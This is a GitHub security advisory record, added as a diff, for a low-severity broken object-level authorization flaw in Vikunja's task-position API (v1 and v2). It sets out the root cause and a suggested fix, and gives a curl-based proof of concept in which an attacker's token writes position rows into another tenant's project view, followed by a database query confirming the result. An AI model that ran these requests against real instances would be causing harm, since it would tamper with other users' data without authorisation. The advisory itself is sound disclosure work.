@@ -1,0 +1,66 @@
+{
+  "id": "GHSA-w39f-h553-h2mx",
+  "modified": "2026-10-09T21:00:15.914676050Z",
+  "published": "2026-10-09T20:51:41Z",
+  "aliases": [
+    "CVE-2026-91984"
+  ],
+  "summary": "Vikunja: Cross-tenant task-position rows can be injected into arbitrary project views via the unvalidated project_view_id in the task position endpoint (v1 and v2)",
+  "details": "## Summary\n\nThe task-position endpoint authorizes only the task side of the write: `TaskPosition.CanUpdate` delegates to `Task.CanUpdate` (write access to the task's own project) and the request body's `project_view_id` is never validated to belong to the task's project, nor is any access to that view required. Any authenticated user with a single writable task of their own can persist `(task_id, project_view_id, position)` rows into any other tenant's project view (view IDs are small sequential integers and enumerable). Low position values (below `MinPositionSpacing`, 0.01) enter the recalculation branch, but `RecalculateTaskPositions` aborts on its own project read-access check before recalculating and the whole transaction rolls back, so no cross-tenant recalculation actually executes — only the plain row insert (position ≥ 0.01) persists. This is the same root-cause pattern as GHSA-569v-q83c-3j3g (kanban bucket relocation via project_view_id mass-assignment, fixed with a dual-side check for buckets in 2.4.0) surviving in the sibling position endpoint. Verified on Vikunja 2.5.0.\n\n## Details\n\nAffected endpoints (both verified):\n\n- v1: `POST /api/v1/tasks/{id}/position`\n- v2: `PUT /api/v2/tasks/{id}/position`\n\nRoot cause in `pkg/models/task_position.go`:\n\n- `CanUpdate` (lines 61-64) checks only `Task.CanUpdate` — i.e. the caller's write access to the task's own project.\n- `updateTaskPosition` (lines 174-232) upserts `(task_id, project_view_id, position)` directly; there is no check that the view belongs to the task's project and no access check on the view's project.\n- `ProjectViewID` is body-bindable (`json:\"project_view_id\"`, no readOnly/param restriction, line 42).\n\nContrast with the fixed sibling: the bucket-move endpoint (`POST /projects/{project}/views/{view}/buckets/{bucket}/tasks`, `pkg/models/kanban_task_bucket.go:53-68`) validates both the bucket and the task after the GHSA-5pg6/GHSA-569v family fixes — the position endpoint was never given the equivalent view-side check.\n\nObserved behavior (two independent verification runs): an attacker with zero access to the victim project receives `200 {\"task_id\": ..., \"project_view_id\": \u003cvictim view\u003e, \"position\": ...}` on both v1 and v2, and the row is persisted (verified directly in the `task_positions` table: rows for the victim view went 0 to 1). Positioning the victim's own task is correctly refused with 403, isolating the missing view-side check. The victim's listings do not surface the foreign task (no confidentiality impact demonstrated), and a low-position (\u003c 0.01) injection enters the recalculation branch but `RecalculateTaskPositions` returns 403 (`getRelevantProjectsFromCollection` → `CanRead` on the victim project) before any recalculation runs, rolling the whole request back — so the low-position variant persists nothing and never rewrites the victim's ordering.\n\n## PoC\n\nSteps use the owner of the victim project (token `$OWNER`) and an attacker with only their own project (token `$ATTACKER`). All requests were executed against a local Vikunja 2.5.0 instance.\n\n1. Owner creates a private project (default views included) and lists its views to obtain a victim view ID:\n\n```\ncurl -X PUT \"$BASE/api/v1/projects\" -H \"Authorization: Bearer $OWNER\" \\\n  -H 'Content-Type: application/json' -d '{\"title\":\"victim\"}'\n# -\u003e {\"id\":200,...}\n\ncurl \"$BASE/api/v1/projects/200/views\" -H \"Authorization: Bearer $OWNER\"\n# -\u003e [{\"id\":771,\"view_kind\":\"kanban\",...}, ...]   # remember VIEW=771\n```\n\n2. Attacker creates their own project and a task in it:\n\n```\ncurl -X PUT \"$BASE/api/v1/projects\" -H \"Authorization: Bearer $ATTACKER\" \\\n  -H 'Content-Type: application/json' -d '{\"title\":\"attacker\"}'\n# -\u003e {\"id\":201,...}\n\ncurl -X PUT \"$BASE/api/v1/projects/201/tasks\" -H \"Authorization: Bearer $ATTACKER\" \\\n  -H 'Content-Type: application/json' -d '{\"title\":\"evil\"}'\n# -\u003e {\"id\":105,...}\n```\n\n3. Baseline — attacker positions their task in their own view (succeeds, expected):\n\n```\ncurl -X POST \"$BASE/api/v1/tasks/105/position\" -H \"Authorization: Bearer $ATTACKER\" \\\n  -H 'Content-Type: application/json' -d '{\"project_view_id\": \u003cOWN_VIEW\u003e, \"position\": 100}'\n# -\u003e 200\n```\n\n4. Mutation — attacker writes their task's position into the victim's view (no access to it whatsoever):\n\n```\ncurl -X POST \"$BASE/api/v1/tasks/105/position\" -H \"Authorization: Bearer $ATTACKER\" \\\n  -H 'Content-Type: application/json' -d '{\"project_view_id\": 771, \"position\": 100}'\n# -\u003e 200 {\"task_id\":105,\"project_view_id\":771,\"position\":100}\n\ncurl -X PUT \"$BASE/api/v2/tasks/105/position\" -H \"Authorization: Bearer $ATTACKER\" \\\n  -H 'Content-Type: application/json' -d '{\"project_view_id\": 771, \"position\": 101}'\n# -\u003e 200 (v2 twin behaves identically)\n```\n\n5. Control — attacker positioning the victim's own task is correctly refused (the task-level gate works; only the view side is missing):\n\n```\ncurl -X POST \"$BASE/api/v1/tasks/\u003cVICTIM_TASK\u003e/position\" -H \"Authorization: Bearer $ATTACKER\" \\\n  -H 'Content-Type: application/json' -d '{\"project_view_id\": 771, \"position\": 1}'\n# -\u003e 403 Forbidden\n```\n\n6. Persistence proof — the cross-tenant row exists in the database:\n\n```\ndocker exec \u003cdb\u003e psql -U vikunja -d vikunja -t -A -c \\\n  \"SELECT task_id, position FROM task_positions WHERE project_view_id=771 AND task_id=105;\"\n# -\u003e 105|100        (row for the attacker's task inside the victim's view namespace)\n```\n\nObserved result: steps 4 and 6 succeed — a `task_positions` row `(attacker_task, victim_view)` is created and persisted; step 5 is refused with 403. Note: `\"position\": 1` is above `MinPositionSpacing` (0.01), so it never enters the recalculation branch — it is a plain upsert. A position \u003c 0.01 does enter the branch but is refused with 403 and rolled back (see Impact).\n\n## Impact\n\n**Impact summary:** a genuine broken-object-level-authorization defect (CWE-639) with no demonstrated confidentiality, integrity, or availability impact. The injected rows are invisible to the victim (view listings filter by project), order-preserving (any position collision is respaced between the same neighbours), and self-healing (any legitimate recalculation of the view deletes and rebuilds all its position rows). No read access, no privilege gain, no data destruction, and no usable DoS. Rated **low** — the fix is defense-in-depth, and its main value is preventing this wrong-object authorization from becoming a real cross-tenant leak should any future read path join `task_positions` without re-checking task-project access.\n\nBroken object-level authorization on the write side (CWE-639, CWE-863: the authorization decision uses one resource dimension — the task — while the write targets another — the view). Any authenticated user holding a single writable task can persist rows into any other tenant's view state instance-wide (view IDs sequential and enumerable). The recalculation/lock path is not usable cross-tenant: a low position (\u003c 0.01) enters the branch but `RecalculateTaskPositions` fails its own project read-access check and rolls back before recalculating (on MySQL/PostgreSQL a `FOR UPDATE` lock on the view row is taken one statement earlier in the same transaction, but released immediately on that rollback; SQLite takes no lock), so there is no meaningful availability angle. No confidentiality breach was demonstrated (victim listings filter by project), and the pollution is recoverable. Suggested fix: in `CanUpdate` or before the upsert, load the view by `tp.ProjectViewID` and require `view.ProjectID == task.ProjectID` (and/or caller access to the view's project), mirroring the bucket-side fix for GHSA-569v.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.vikunja.io/api",
+        "purl": "pkg:golang/code.vikunja.io/api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.6.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.5.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-w39f-h553-h2mx/GHSA-w39f-h553-h2mx.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-w39f-h553-h2mx"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-91984"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/pull/3688"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/commit/077dc4de79ce6f1ab59215a2c7bf9b30423685f2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-vikunja/vikunja"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/releases/tag/v2.6.0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/vikunja-before-2.6.0-broken-object-level-authorization-via-task-position"
+    }
+  ]
+}
